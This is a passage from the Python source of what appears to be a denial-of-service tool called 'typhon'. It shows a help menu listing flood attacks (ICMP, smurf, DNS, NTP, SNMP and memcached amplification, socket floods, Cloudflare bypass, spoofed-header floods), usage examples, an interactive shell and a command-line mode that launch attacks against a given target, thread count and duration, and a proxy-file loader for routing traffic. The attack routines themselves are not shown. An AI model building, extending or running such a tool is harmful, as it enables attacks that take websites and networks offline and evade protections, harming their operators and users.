{Fore.CYAN}  {Fore.MAGENTA}LAYER 3 — ICMP Attacks{Fore.CYAN}                                              
{Fore.CYAN}    icmp       - ICMP echo flood                                                  
{Fore.CYAN}    smurf      - Smurf attack (broadcast ICMP)                                   
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.CYAN}AMPLIFICATION ATTACKS{Fore.CYAN}                                                 
{Fore.CYAN}    dnsamp     - DNS amplification                                                
{Fore.CYAN}    ntpamp     - NTP amplification                                                
{Fore.CYAN}    snmpamp    - SNMP amplification                                               
{Fore.CYAN}    memcached  - Memcached amplification                                         
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.WHITE}SOCKET/PROTOCOL ATTACKS{Fore.CYAN}                                               
{Fore.CYAN}    soc        - Raw socket flood (HTTP requests)                                
{Fore.CYAN}    spoof      - HTTP flood with spoofed headers                                 
{Fore.CYAN}    bypass     - Cloudflare bypass (cloudscraper)                                
{Fore.CYAN}    cfsoc      - Cloudflare bypass (socket + cookies)                            
{Fore.CYAN}    pps        - Packets per second flood                                        
{Fore.CYAN}    null       - NULL header flood                                               
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.GREEN}SPECIAL ATTACKS{Fore.CYAN}                                                        
{Fore.CYAN}    sky        - SKY attack (mixed protocol + proxy)                             
{Fore.CYAN}    stellar    - STELLAR attack (pure socket speed)                              
{Fore.CYAN}    tornado    - TORNADO attack (HTTP/2 + socket mixed)                          
{Fore.CYAN}    hurricane  - HURRICANE attack (multi-method flood)                           
{Fore.CYAN}    tsunami    - TSUNAMI attack (maximum socket flood)                           
{Fore.CYAN}    earthquake - EARTHQUAKE attack (massive parallel connections)                
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.MAGENTA}UTILITIES{Fore.CYAN}                                                             
{Fore.CYAN}    help       - Show this help                                                  
{Fore.CYAN}    clear      - Clear screen                                                    
{Fore.CYAN}    exit       - Exit program                                                    
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.YELLOW}Usage Examples:{Fore.CYAN}                                                       
{Fore.CYAN}    get https://example.com 500 60                                               
{Fore.CYAN}    slowloris https://example.com 300 120                                        
{Fore.CYAN}    udp 192.168.1.1:80 1000 30                                                  
{Fore.CYAN}    dnsamp example.com 200 60                                                    
{Fore.CYAN}    bypass https://example.com 500 120                                           
{Fore.CYAN}    hurricane https://example.com 200 30                                         
{Fore.CYAN}                                                                                   
{Fore.CYAN}{Style.RESET_ALL}
"""
    print(help_text)

def interactive_shell():
    global proxy_manager, proxies
    
    print_main_banner()
    
    # Load proxies
    load_proxies()
    proxy_manager = ProxyManager()
    
    print(f"\n{Fore.GREEN} System ready! Type 'help' for available commands.{Style.RESET_ALL}")
    print(f"{Fore.CYAN} Loaded {len(ua)} user agents, {len(proxies)} proxies{Style.RESET_ALL}\n")
    
    while True:
        try:
            cmd = input(f"{Fore.GREEN}typhon{Fore.RED}@{Fore.CYAN}~{Fore.WHITE}# ").strip()
            
            if not cmd:
                continue
            
            parts = cmd.split()
            command = parts[0].lower()
            
            if command in ['exit', 'quit', 'q']:
                print(f"{Fore.YELLOW} Goodbye!{Style.RESET_ALL}")
                if proxy_manager:
                    proxy_manager.stop()
                break
            
            elif command in ['clear', 'cls']:
                print_main_banner()
                continue
            
            elif command in ['help', '?']:
                show_help()
                continue
            
            elif command == 'stats':
                print_stats()
                print()
                continue
            
            elif command in ATTACK_METHODS or command in ['udp', 'udpfrag', 'syn', 'ack', 'rst', 'fin', 'xmas', 'icmp', 'smurf', 'dnsamp', 'ntpamp', 'snmpamp', 'memcached']:
                if len(parts) < 4:
                    print(f"{Fore.RED} Usage: {command} <target> <threads> <duration>{Style.RESET_ALL}")
                    continue
                
                try:
                    target = parts[1]
                    threads = int(parts[2])
                    duration = int(parts[3])
                    
                    if duration > config.max_attack_duration:
                        print(f"{Fore.YELLOW} Duration exceeds max ({config.max_attack_duration}s). Adjusting...{Style.RESET_ALL}")
                        duration = config.max_attack_duration
                    
                    launch_attack(command, target, threads, duration)
                except ValueError:
                    print(f"{Fore.RED} Threads and duration must be numbers!{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED} Error: {e}{Style.RESET_ALL}")
                    logger.error(f"Command error: {e}")
            else:
                print(f"{Fore.RED} Unknown command. Type 'help' for available commands.{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW} Exiting...{Style.RESET_ALL}")
            if proxy_manager:
                proxy_manager.stop()
            break
        except Exception as e:
            print(f"{Fore.RED} Error: {e}{Style.RESET_ALL}")
            logger.error(f"Shell error: {e}")

# ============================================================
# COMMAND LINE MODE
# ============================================================

def command_line_mode():
    if len(sys.argv) < 4:
        print(f"""
{Fore.YELLOW}Usage:{Style.RESET_ALL}
  python3 main.py <method> <target> <threads> <duration>

{Fore.CYAN}Examples:{Style.RESET_ALL}
  python3 main.py get https://example.com 500 60
  python3 main.py slowloris https://example.com 300 120
  python3 main.py udp 192.168.1.1:80 1000 30
  python3 main.py dnsamp example.com 200 60
  python3 main.py bypass https://example.com 500 120
  python3 main.py hurricane https://example.com 200 30

{Fore.GREEN}Available Methods:{Style.RESET_ALL}
  get, post, head, put, delete, options, patch
  httpx, httpxp, slowloris, slowpost, rudy
  syn, ack, rst, fin, xmas, udp, udpfrag
  icmp, smurf, dnsamp, ntpamp, snmpamp, memcached
  soc, spoof, bypass, cfsoc, pps, null
  sky, stellar, tornado, hurricane, tsunami, earthquake

{Fore.MAGENTA}Note:{Style.RESET_ALL} Layer 4 attacks use <ip:port> format for target
""")
        sys.exit(1)
    
    method = sys.argv[1].lower()
    target = sys.argv[2]
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    
    # Load proxies
    load_proxies()
    global proxy_manager
    proxy_manager = ProxyManager()
    
    launch_attack(method, target, threads, duration)
    
    if proxy_manager:
        proxy_manager.stop()

# ============================================================
# PROXY LOADER
# ============================================================

def load_proxies():
    global proxies
    proxy_files = ['./proxy.txt', './proxies.txt', './socks4.txt', './socks5.txt']
    for pf in proxy_files:
        if os.path.exists(pf):
            try:
                with open(pf, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            proxies.append(line)
                logger.info(f"Loaded proxies from {pf}")
            except Exception as e:
                logger.warning(f"Failed to load {pf}: {e}")
    
    if proxies:
        proxies = list(set(proxies))  # Deduplicate
        logger.info(f"Total proxies loaded: {len(proxies)}")
    else:
        logger.warning("No proxy files found")

# ============================================================
# MAIN ENTRY
# ============================================================

if __name__ == '__main__':
    print_main_banner()
    
    if len(sys.argv) < 2:
        interactive_shell()
    else:
        command_line_mode()